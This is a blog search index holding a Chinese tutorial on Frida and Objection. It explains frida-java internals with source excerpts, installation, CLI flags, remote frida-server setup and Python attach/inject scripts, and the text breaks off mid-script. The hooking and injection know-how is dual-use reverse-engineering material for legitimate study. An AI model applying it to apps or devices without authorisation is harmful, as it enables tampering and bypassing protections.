<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/posts/d87f7e0c.html"/>
      <url>/posts/d87f7e0c.html</url>
      
        <content type="html"><![CDATA[<p><img src="/2025-01-15-test/img.png" alt="图片"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>frida与Objection</title>
      <link href="/posts/b00b5fdb.html"/>
      <url>/posts/b00b5fdb.html</url>
      
        <content type="html"><![CDATA[<h1 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h1><p>frida一些API使用参考<a href="https://www.anquanke.com/post/id/195869#h3-20">https://www.anquanke.com/post/id/195869#h3-20</a>   官方文档：frida.re</p><h2 id="frida的代码结构"><a href="#frida的代码结构" class="headerlink" title="frida的代码结构"></a>frida的代码结构</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">frida-core：frida核心库</span><br><span class="line">frida-gum：inline-hook框架</span><br><span class="line"></span><br><span class="line"><span class="keyword">bindings：</span></span><br><span class="line"><span class="keyword"></span>frida-python：python</span><br><span class="line">frida-node：Node.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>frida-qml：Qml</span><br><span class="line">frida-<span class="keyword">swift：Swift</span></span><br><span class="line"><span class="keyword"></span>frida-tools：CLI tools</span><br><span class="line"><span class="symbol">capstone:</span><span class="keyword">instruction </span><span class="keyword">disammbler</span></span><br><span class="line"><span class="keyword"></span>gum-<span class="keyword">js：为 </span>frida-gum 提供 <span class="keyword">JavaScript </span>语言的接口。</span><br></pre></td></tr></table></figure><h2 id="frida实现hook的原理"><a href="#frida实现hook的原理" class="headerlink" title="frida实现hook的原理"></a>frida实现hook的原理</h2><p><a href="https://bbs.kanxue.com/thread-229215.htm">https://bbs.kanxue.com/thread-229215.htm</a></p><p><a href="https://bbs.kanxue.com/thread-273450.htm#msg_header_h2_2">https://bbs.kanxue.com/thread-273450.htm#msg_header_h2_2</a></p><p>frida-java实现了js到java代码的单向通道，即可以通过frida-java，我们可以利用js代码实现：调用java方法，创建java对象，对java函数方法进行hook。</p><p><strong>从两个方面来解析frida-java源码</strong></p><ul><li>frida-java是如何连通到java世界的</li><li>frida-java如何实现java层方法hook</li></ul><h3 id="frida-java是如何连通到java世界的"><a href="#frida-java是如何连通到java世界的" class="headerlink" title="frida-java是如何连通到java世界的"></a>frida-java是如何连通到java世界的</h3><ul><li>通过frida-gum提供的js接口操作native世界，然后再基于jni连通到java世界<img src="2025-01-15-frida与Objection/image-20241024145016576.png" alt="image-20241024145016576"></li></ul><p>主要步骤：</p><ol><li>通过frida-gum连接native世界，获得一些虚拟机接口，如JNI_GetCreatedJavaVMs</li><li>获得javaVM</li><li>获得JNIENv</li><li>获得java类的class引用</li><li>操作该java类，如创建对象，调用方法</li></ol><h4 id="连通native世界"><a href="#连通native世界" class="headerlink" title="连通native世界"></a>连通native世界</h4><p>利用frida-gum中提供的Moudle,Memory,NativeFunction模块可以实现查找、调用、hook导出函数；读写、分配内存等操作。如下面例子所示, 可以在js代码中调用native函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> friendlyFunctionName = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(friendlyFunctionPtr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> returnValue = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(sizeOfLargeObject);</span><br><span class="line"><span class="title function_">friendlyFunctionName</span>(returnValue, thisPtr);</span><br></pre></td></tr></table></figure><h4 id="获得JavaVM"><a href="#获得JavaVM" class="headerlink" title="获得JavaVM"></a>获得JavaVM</h4><p>要使用JNI连通java世界，首先要获得JavaVM。frida-java通过调用JNI_GetCreatedJavaVMs来获取JavaVM，Dalvik虚拟机和ART虚拟机均实现了该函数。核心代码如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/android.js</span></span><br><span class="line"><span class="keyword">const</span> vms = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(pointerSize);</span><br><span class="line"><span class="keyword">const</span> vmCount = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(jsizeSize);</span><br><span class="line"><span class="title function_">checkJniResult</span>(<span class="string">&#x27;JNI_GetCreatedJavaVMs&#x27;</span>, temporaryApi.<span class="title function_">JNI_GetCreatedJavaVMs</span>(vms, <span class="number">1</span>, vmCount));</span><br><span class="line"><span class="keyword">if</span> (<span class="title class_">Memory</span>.<span class="title function_">readInt</span>(vmCount) === <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">temporaryApi.<span class="property">vm</span> = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vms);</span><br></pre></td></tr></table></figure><p>此时获得的vm只是JavaVM的一个指针，在此基础上frida-java还会构造一个VM对象，该对象相当于在js层实现了一个JavaVM的代理对象，封装了一些JavaVM的方法，如getEnv。其中vm.handle中保存的是原始的JavaVM对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/vm.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">VM</span> (<span class="params">api</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> handle = <span class="literal">null</span>;  <span class="comment">//保存JavaVM指针</span></span><br><span class="line">  <span class="keyword">let</span> attachCurrentThread = <span class="literal">null</span>;  <span class="comment">//封装了JavaVM.AttachCurrentThread</span></span><br><span class="line">  <span class="keyword">let</span> detachCurrentThread = <span class="literal">null</span>;  <span class="comment">//封装了JavaVM.DetachCurrentThread;</span></span><br><span class="line">  <span class="keyword">let</span> getEnv = <span class="literal">null</span>;  <span class="comment">//封装了JavaVM.getEnv</span></span><br><span class="line">  <span class="keyword">const</span> attachedThreads = &#123;&#125;;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">initialize</span> (<span class="params"></span>) &#123;</span><br><span class="line">    handle = api.<span class="property">vm</span>;</span><br><span class="line">    <span class="comment">//获取JavaVM的虚函数表</span></span><br><span class="line">    <span class="keyword">const</span> vtable = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(handle);</span><br><span class="line">    attachCurrentThread = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vtable.<span class="title function_">add</span>(<span class="number">4</span> * pointerSize)), <span class="string">&#x27;int32&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    detachCurrentThread = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vtable.<span class="title function_">add</span>(<span class="number">5</span> * pointerSize)), <span class="string">&#x27;int32&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    getEnv = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vtable.<span class="title function_">add</span>(<span class="number">6</span> * pointerSize)), <span class="string">&#x27;int32&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int32&#x27;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VM的初始化过程为首先获取JavaVM的指针，通过JNI_GetCreatedJavaVMs调用），然后读取JavaVM的虚函数表，获得JavaVM的一些重要方法，并在js层包装一层，这样就在js层实现了一个JavaVM的代理，可以通过调用VM.getEnv来实现native层的JavaVM.getEnV调用。</p><p>获取到JavaVM后，就可以通过将当前线程与JavaVM相关联，然后得到JNIEnv对象，进行后续操作。上述工作由VM.perform完成，看下VM.perform源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vm.js</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">tryGetEnv</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> envBuf = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(pointerSize);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="title function_">getEnv</span>(handle, envBuf, <span class="variable constant_">JNI_VERSION_1_6</span>);</span><br><span class="line">    <span class="keyword">if</span> (result !== <span class="variable constant_">JNI_OK</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Env</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(envBuf), <span class="variable language_">this</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">perform</span> = <span class="keyword">function</span> (<span class="params">fn</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> threadId = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//将当前线程附加到JavaVM，获取JNIEnv对象</span></span><br><span class="line">    <span class="keyword">let</span> env = <span class="variable language_">this</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">    <span class="keyword">const</span> alreadyAttached = env !== <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!alreadyAttached) &#123;</span><br><span class="line">      env = <span class="variable language_">this</span>.<span class="title function_">attachCurrentThread</span>();</span><br><span class="line"> </span><br><span class="line">      threadId = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">      attachedThreads[threadId] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="title function_">fn</span>();  <span class="comment">//执行fn</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!alreadyAttached) &#123;</span><br><span class="line">        <span class="keyword">const</span> allowedToDetach = attachedThreads[threadId];</span><br><span class="line">        <span class="keyword">delete</span> attachedThreads[threadId];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (allowedToDetach) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">detachCurrentThread</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>和JavaVM一样，frida-java也会在js层为JNIEnv建立一个代理，具体在env.js实现</p><h4 id="获得Java类的class引用"><a href="#获得Java类的class引用" class="headerlink" title="获得Java类的class引用"></a>获得Java类的class引用</h4><p>和JNI操作方式一样，我们在native层获得了JNIEnv后，要想操作java类，可以通过调用env-&gt;findClass来获得java类的class引用。但是这里有个问题，因为frida-java所在的线程是通过pthread_create创造的，然后通过AttachCurrentThread获取的JNIEnv，此时FindClass只会从系统的classloader开始查找，所以app自身的类是无法通过env-&gt;findClass来获取。因此需要手工的获取到加载该app的classloader。Java.perform在调用VM.perform之前会先获取加载该app的classloader，并保存到classFactory.loader。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">perform</span> = <span class="keyword">function</span> (<span class="params">fn</span>) &#123;</span><br><span class="line">    <span class="title function_">assertJavaApiIsAvailable</span>();</span><br><span class="line">      <span class="comment">//目标进程不是app，并且classloader已经初始化</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">isAppProcess</span>() || classFactory.<span class="property">loader</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">      threadsInPerform++;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        vm.<span class="title function_">perform</span>(fn);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="keyword">throw</span> e; &#125;, <span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        threadsInPerform--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//第一次调用java.perform时，会先获取加载该app的classloader</span></span><br><span class="line">      pending.<span class="title function_">push</span>(fn);</span><br><span class="line">      <span class="keyword">if</span> (pending.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        threadsInPerform++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          vm.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="title class_">ActivityThread</span> = classFactory.<span class="title function_">use</span>(<span class="string">&#x27;android.app.ActivityThread&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> app = <span class="title class_">ActivityThread</span>.<span class="title function_">currentApplication</span>();</span><br><span class="line">            <span class="keyword">if</span> (app !== <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">//获取到加载该app的classloader</span></span><br><span class="line">              classFactory.<span class="property">loader</span> = app.<span class="title function_">getClassLoader</span>();</span><br><span class="line">              <span class="title function_">performPending</span>(); <span class="comment">// already initialized, continue</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">const</span> m = <span class="title class_">ActivityThread</span>.<span class="property">getPackageInfoNoCheck</span>;</span><br><span class="line">              <span class="keyword">let</span> initialized = <span class="literal">false</span>;</span><br><span class="line">              m.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> apk = m.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">                <span class="keyword">if</span> (!initialized) &#123;</span><br><span class="line">                  initialized = <span class="literal">true</span>;</span><br><span class="line">                  classFactory.<span class="property">loader</span> = apk.<span class="title function_">getClassLoader</span>();</span><br><span class="line">                  <span class="title function_">performPending</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> apk;</span><br><span class="line">              &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          threadsInPerform--;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>frida-java使用Java.use来获得java类的class引用，Java.use(className),返回java类的一个wrapper,在js世界里，用该wrapper来操作对应的java类。Java.use直接调用了classFactory.use,代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/class-factory.js</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">use</span> = <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> C = classes[className]; <span class="comment">//先从缓存中查找</span></span><br><span class="line">    <span class="keyword">if</span> (!C) &#123;</span><br><span class="line">      <span class="keyword">const</span> env = vm.<span class="title function_">getEnv</span>();  <span class="comment">//获取jni_env, 调用native层的JavaVm.GetEnv  </span></span><br><span class="line">      <span class="keyword">if</span> (loader !== <span class="literal">null</span>) &#123;  <span class="comment">//loader已经在Java.perform中初始化了</span></span><br><span class="line">        <span class="keyword">const</span> usedLoader = loader;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (cachedLoaderMethod === <span class="literal">null</span>) &#123;</span><br><span class="line">          cachedLoaderInvoke = env.<span class="title function_">vaMethod</span>(<span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">          cachedLoaderMethod = loader.<span class="property">loadClass</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">handle</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> getClassHandle = <span class="keyword">function</span> (<span class="params">env</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> classNameValue = env.<span class="title function_">newStringUtf</span>(className);</span><br><span class="line">          <span class="keyword">const</span> tid = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">          <span class="title function_">ignore</span>(tid);</span><br><span class="line">          <span class="keyword">try</span> &#123;       <span class="comment">//env.handle 指向jni层的JNIEnv, 利用jni调用classloader.loadClass(className)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cachedLoaderInvoke</span>(env.<span class="property">handle</span>, usedLoader.<span class="property">$handle</span>, cachedLoaderMethod, classNameValue);</span><br><span class="line">          &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title function_">unignore</span>(tid);</span><br><span class="line">            env.<span class="title function_">deleteLocalRef</span>(classNameValue);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//构建对应java类的wrapper</span></span><br><span class="line">        C = <span class="title function_">ensureClass</span>(getClassHandle, className);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>借助于该wrapper，可以对java类进行操作，如调用构造函数创建对象。该wrapper的初始化过程如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/class-factory.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initializeClass</span> (<span class="params"></span>) &#123;</span><br><span class="line">    klass.<span class="property">__name__</span> = name;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> ctor = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> getCtor = <span class="keyword">function</span> (<span class="params">type</span>) &#123;&#125;;</span><br><span class="line">    <span class="comment">//定义了一些每个类都公有的函数和属性</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$new&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$alloc&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$init&#x27;</span>, &#123;&#125;);</span><br><span class="line">    klass.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$dispose</span> = dispose;</span><br><span class="line">    klass.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$isSameObject</span> = <span class="keyword">function</span> (<span class="params">obj</span>) &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;class&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$className&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="comment">//添加该类特有的函数和属性</span></span><br><span class="line">    <span class="title function_">addMethodsAndFields</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>借助于该wrapper的$init方法，就可以创建java对象。</p><h1 id="frida安装"><a href="#frida安装" class="headerlink" title="frida安装"></a>frida<strong>安装</strong></h1><h2 id="frida与frida-tools"><a href="#frida与frida-tools" class="headerlink" title="frida与frida-tools"></a>frida与frida-tools</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==<span class="number">14.2</span><span class="number">.18</span> frida-tools==<span class="number">9.2</span><span class="number">.5</span> -i https://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure><h2 id="frida参数"><a href="#frida参数" class="headerlink" title="frida参数"></a>frida参数</h2><p>向手机中安装测试版apk时，用如下命令安装</p><p><code>adb install -g -t -d -r xxx.apk</code></p><ul><li><strong>-U：使用USB设备连接</strong></li><li>-R：使用远程设备连接</li><li>-H：指定远程设备的主机名或IP</li><li>-P：指定远程设备的密码</li><li><strong>-f：附加到指定的进程</strong></li><li>-n：指定要附加的进程的名称</li><li>-p：指定要附加的进程PID</li><li><strong>-l：指定要运行的JS脚本</strong></li><li>-F：附件打手机最前面的app，这样就可以不用每次写包名了 frida -U -F -l Hook.js</li><li>-o：内容输出到文件中</li></ul><p>frida-ps：查看电脑端的进程</p><p>frida-ps -U：查看手机端进程</p><ul><li>当开启多个手机端时 adb -s xxx shell   指定手机端</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>frida连接多主机多端口</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>监听非标准端口 真机</span><br><span class="line"><span class="number">1</span>.启动frida-server</span><br><span class="line">.<span class="regexp">/data/</span>local<span class="regexp">/tmp/</span>frida -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">9999</span>   <span class="regexp">//</span>其中<span class="number">0.0</span>.<span class="number">0.0</span>是手机本地ip <span class="number">9999</span>是端口</span><br><span class="line"><span class="number">2</span>.启动frida</span><br><span class="line">frida -H 手机端wifi的ip地址:<span class="number">9999</span> -F</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>监听非标准端口 模拟器</span><br><span class="line">.<span class="regexp">/data/</span>local<span class="regexp">/tmp/</span>frida -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">6666</span></span><br><span class="line">adb forward tcp:<span class="number">6666</span> tcp:<span class="number">6666</span></span><br><span class="line">frida -H <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6666</span> -F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在主机中</span><br><span class="line">开启fridaserver  ./fs14 -l <span class="string">&quot;0.0.0.0:8888&quot;</span></span><br><span class="line">在虚拟机中也可以执行frida </span><br><span class="line">frida -H <span class="string">&quot;手机ip:8888&quot;</span> -F -l xxx.js</span><br></pre></td></tr></table></figure><h3 id="Spawning模式"><a href="#Spawning模式" class="headerlink" title="Spawning模式"></a>Spawning模式</h3><p>frida -U -f 包名 -l 脚本.js —no-pause</p><h3 id="Attach模式"><a href="#Attach模式" class="headerlink" title="Attach模式"></a>Attach模式</h3><p>frida -U 包名 -l 脚本.js</p><h1 id="python与frida的交互使用"><a href="#python与frida的交互使用" class="headerlink" title="python与frida的交互使用"></a>python与frida的交互使用</h1><h2 id="python脚本实现frida基本框架"><a href="#python脚本实现frida基本框架" class="headerlink" title="python脚本实现frida基本框架"></a>python脚本实现frida基本框架</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">console.log(&quot;zxk1ng&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">message, data</span>):   <span class="comment">#js中执行send函数后要回调的函数,用于处理从js发送的消息</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;包名&#x27;</span>)</span><br><span class="line"><span class="comment">#process = frida.get_device_manager().add_remote_device(&#x27;127.0.0.1:9999&#x27;).attach(&#x27;包名&#x27;)    非标准端口时附加</span></span><br><span class="line">script= process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)   <span class="comment">#绑定事件</span></span><br><span class="line">script.load()                   <span class="comment">#注入</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="python脚本实现frida的Spawn模式"><a href="#python脚本实现frida的Spawn模式" class="headerlink" title="python脚本实现frida的Spawn模式"></a>python脚本实现frida的Spawn模式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 